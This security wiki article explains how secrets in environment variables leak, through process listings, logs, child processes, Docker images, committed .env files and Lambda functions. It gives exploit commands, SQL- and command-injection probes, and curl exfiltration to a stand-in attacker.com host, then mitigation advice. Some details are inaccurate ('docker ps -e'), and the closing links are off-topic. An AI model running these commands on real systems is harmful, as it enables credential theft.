# Exposure of Sensitive Information Through Environment Variables

Exposure of Sensitive Information Through Environment Variables occurs when applications store sensitive information in plaintext environment variables. Environment variables are accessible to all processes running with the same execution context, including child processes, dependencies, and in cloud environments, to other functions and containers.

Developers use environment variables to configure applications without hardcoding credentials—a good practice. But if those variables contain unencrypted passwords, API keys, database credentials, and tokens, they become a security liability accessible to any process that can read the environment.

***

### Real-World Attack Scenarios

#### Scenario 1: Process Inspection on Shared Server

A shared hosting environment runs multiple applications as the same user. An attacker compromises one application and uses `ps` or `/proc` to inspect other running processes:

**Vulnerable setup:**

```bash
# Application 1 - Vulnerable to compromise
APP1_DB_PASSWORD=production_pass_123 node app1.js

# Application 2 - Running as same user
APP2_API_KEY=sk_REDACTED_live_4eC39HqLyjWDarht node app2.js

# Application 3
APP3_STRIPE_SECRET=rk_live_51234567890 python app3.py
```

**The attack:**

```bash
# After compromising app1, attacker runs:
ps aux | grep -E "APP|KEY|PASSWORD"

# Output:
# user 1234 /usr/bin/node app1.js
# user 1235 /usr/bin/node app2.js APP2_API_KEY=sk_REDACTED_live_4eC39HqLyjWDarht
# user 1236 /usr/bin/python app3.py APP3_STRIPE_SECRET=rk_live_51234567890

# Or directly read /proc:
cat /proc/1235/environ | tr '\0' '\n' | grep API_KEY
```

The attacker now has API keys and secrets from all running applications.

**Finding it:** Check how environment variables are set. On shared systems, test if you can inspect other processes' environment. Look for sensitive data in process listings.

**Exploit:**

```bash
# List environment variables of all processes
cat /proc/[PID]/environ | tr '\0' '\n'

# Or use ps to see environment of running processes
ps eww -p [PID]

# If you have code execution, capture environment
env | grep -i "key\|password\|secret\|token\|api"
```

***

#### Scenario 2: Environment Variables in Logs and Error Messages

An application logs its configuration during startup:

```python
# Vulnerable code
import os
import logging

logger = logging.getLogger(__name__)

def initialize_app():
    db_host = os.getenv('DB_HOST')
    db_user = os.getenv('DB_USER')
    db_password = os.getenv('DB_PASSWORD')
    api_key = os.getenv('API_KEY')
    
    # Logging the configuration
    logger.info(f"Connecting to database at {db_host}")
    logger.info(f"Database user: {db_user}")
    logger.info(f"Using configuration: {os.environ}")  # All variables logged
    
    return {
        'db_host': db_host,
        'db_password': db_password,
        'api_key': api_key
    }
```

**The logs contain:**

```
INFO: Connecting to database at db.internal.company.com
INFO: Database user: admin
INFO: Using configuration: DB_HOST=db.internal.company.com DB_USER=admin DB_PASSWORD=SecurePass123! API_KEY=sk_REDACTED_test_123456 STRIPE_SECRET=sk_REDACTED_live_789 AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

If logs are accessible (via log aggregation services, exposed log files, or log storage), the attacker has all credentials.

**The attack vectors:**

* Reading application log files directly
* Accessing log aggregation systems (ELK, Splunk, CloudWatch)
* Exploiting log forwarding services with weak authentication
* Finding logs in backup files or archives
* Searching git history for log outputs

**Finding it:** Check application startup logs. Look for environment variable dumps. Test if configuration is logged. Review what gets logged during errors.

**Exploit:**

```bash
# Search for environment variables in log files
grep -r "API_KEY\|DB_PASSWORD\|SECRET" /var/log/

# Search commit history for .env files or credentials
git log --all --full-history -- ".env"
git log -p -S "DB_PASSWORD" | head -100

# Check for environment variable exposure in error handling
curl "http://example.com/api?id=1' OR '1'='1"
# If error pages dump environment, credentials appear
```

***

#### Scenario 3: Child Process Inheritance in Dependency Injection

An application uses environment variables for configuration and executes third-party tools or dependencies:

```javascript
// Vulnerable code - Node.js
const { exec } = require('child_process');
const path = require('path');

app.get('/process-image', (req, res) => {
    const imagePath = req.query.image;
    
    // All environment variables inherited by child process
    exec(`convert "${imagePath}" -resize 100x100 output.jpg`, (error, stdout, stderr) => {
        if (error) {
            res.send(`Error: ${stderr}`); // Error might expose env vars
        }
        res.send('Image processed');
    });
});

// Environment variables passed to ImageMagick process:
// IMAGE_PROCESSING_API_KEY, DB_PASSWORD, STRIPE_SECRET, etc.
```

A compromised dependency (like ImageMagick) or vulnerability in the executed command can access all environment variables:

```bash
# Malicious ImageMagick plugin executes:
env | exfiltrate_to_attacker.com

# Or injected command:
convert image.jpg; cat /proc/$$/environ | curl -d @- http://attacker.com
```

**The attack:**

1. Application calls third-party tool with inherited environment
2. Attacker compromises or exploits the third-party tool
3. Malicious code reads environment variables
4. Credentials are exfiltrated

**Finding it:** Identify where applications spawn child processes. Check what environment variables are inherited. Look for dependencies that execute external tools. Test if injected commands can access environment.

**Exploit:**

```bash
# If application calls system commands, try command injection
curl "http://example.com/process?input=image.jpg; env"

# The output might include:
# API_KEY=secret123
# DB_PASSWORD=pass456
```

***

#### Scenario 4: Docker Container Environment Exposure

A Docker container is built with secrets in environment variables:

```dockerfile
# Vulnerable Dockerfile
FROM node:16
ENV DB_PASSWORD=production_password_123
ENV API_KEY=sk_REDACTED_live_4eC39HqLyjWDarht
ENV STRIPE_SECRET=sk_REDACTED_live_51234567890

COPY app.js .
CMD ["node", "app.js"]
```

**The attack vectors:**

1. **Image inspection:** Anyone with access to the Docker image can inspect environment variables:

```bash
docker inspect image_name | grep -A 20 "Env"
# Output shows all environment variables
```

2. **Running container access:** If a container is compromised, all variables are readable:

```bash
# Inside compromised container:
env | grep -i "key\|password\|secret"
```

3. **Docker ps output:** Running containers might reveal environment in command output:

```bash
docker ps -e
# Shows environment variables of running containers
```

4. **Kubernetes secrets as environment:** If Kubernetes secrets are mounted as environment variables:

```yaml
env:
  - name: DB_PASSWORD
    valueFrom:
      secretKeyRef:
        name: db-secret
        key: password
```

Any process in the pod can read environment variables.

**Finding it:** Check Docker images for environment variable exposure. Inspect running containers. Test Kubernetes pod access. Review how secrets are mounted.

**Exploit:**

```bash
# If you have access to Docker image:
docker inspect [image_id] --format='{{json .Config.Env}}' | jq

# If you have code execution in container:
env | grep -E "SECRET|KEY|PASSWORD|TOKEN"
```

***

#### Scenario 5: .env File Committed to Version Control

Developers commit the `.env` file containing all environment variables to git:

```bash
# Repository contains .env file:
DB_HOST=production_db.company.com
DB_USER=root
DB_PASSWORD=SuperSecretPassword123!
API_KEY=sk_REDACTED_live_4eC39HqLyjWDarht8Zlt5Kda
STRIPE_SECRET=rk_live_51234567890abcdef
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
SENDGRID_API_KEY=SG.abcdef123456
```

**The attack:**

1. Repository is publicly accessible or breached
2. Attacker clones the repository
3. Entire `.env` file with all credentials is extracted
4. Attacker has production credentials for the entire infrastructure

**Finding it:** Search repositories for `.env` files. Check git history for environment variable leaks. Use tools like `truffleHog` to scan for credentials.

**Exploit:**

```bash
# Search for .env files in repository
find . -name ".env*" -o -name "*.env*"

# Check git history for .env commits
git log --all --full-history -- ".env"

# Extract all secrets from commit history
git log -p | grep -E "PASSWORD|API_KEY|SECRET"

# Use tools to scan for credentials
truffleHog filesystem . --json
```

***

#### Scenario 6: Serverless Function Environment Exposure

AWS Lambda functions are configured with environment variables:

```python
# Lambda function with environment variables
import os
import boto3

def lambda_handler(event, context):
    db_password = os.environ.get('DB_PASSWORD')
    api_key = os.environ.get('API_KEY')
    stripe_secret = os.environ.get('STRIPE_SECRET')
    
    # If function has vulnerability (XXE, injection, etc.)
    # Attacker can extract environment
    
    return {
        'statusCode': 200,
        'body': 'Processed'
    }
```

**The attack:**

1. Lambda function has a vulnerability (XPath injection, command injection, etc.)
2. Attacker exploits the function to execute code
3. Code reads and exfiltrates environment variables
4. AWS credentials and secrets are compromised

Additionally, Lambda execution roles are stored as environment variables and can be exploited to escalate privileges.

**Finding it:** Test Lambda functions for code injection. Check if environment variables can be exfiltrated. Review Lambda IAM roles and attached policies.

***

### Mitigation Strategies

**Never store secrets in environment variables** Use a secrets management system instead:

* AWS Secrets Manager
* HashiCorp Vault
* Azure Key Vault
* Kubernetes Secrets

**If environment variables must be used:**

Encrypt sensitive values in environment:

```python
from cryptography.fernet import Fernet

encrypted_password = Fernet(key).encrypt(b"password")
os.environ['DB_PASSWORD_ENCRYPTED'] = encrypted_password.decode()

# Only decrypt when needed
password = Fernet(key).decrypt(encrypted_password)
```

**Never log environment variables**

```python
# Bad
logger.info(f"Config: {os.environ}")

# Good
logger.info("Application started")
logger.debug(f"Database host: {os.environ.get('DB_HOST')}")  # Don't log password
```

**Don't commit .env files to version control**

```bash
# .gitignore
.env
.env.local
.env.*.local
```

**Rotate credentials regularly** Environment variables with static credentials are more dangerous the longer they exist.

**Use least privilege for processes** Run processes with minimal required permissions to limit damage from compromise.

**Don't pass secrets to child processes**

```python
# Bad - child process inherits all environment
subprocess.run(['tool', 'arg'], env=os.environ)

# Good - pass only needed variables
safe_env = os.environ.copy()
del safe_env['DB_PASSWORD']
del safe_env['API_KEY']
subprocess.run(['tool', 'arg'], env=safe_env)
```

**Audit environment variable access**

* Monitor what processes read environment variables
* Log when secrets are accessed
* Alert on suspicious access patterns

**For cloud environments:**

* Use IAM roles instead of environment credentials (AWS)
* Mount secrets as files instead of environment variables
* Use service accounts with proper RBAC (Kubernetes)

**Clear sensitive environment after use**

```python
api_key = os.environ.pop('API_KEY', None)
# Use api_key
del api_key  # Explicit cleanup
```

***

{% embed url="<https://cvefeed.io/cwe/detail/cwe-11-aspnet-misconfiguration-creating-debug-binary>" %}

{% embed url="<https://portswigger.net/kb/issues/00100800_asp-net-debugging-enabled>" %}
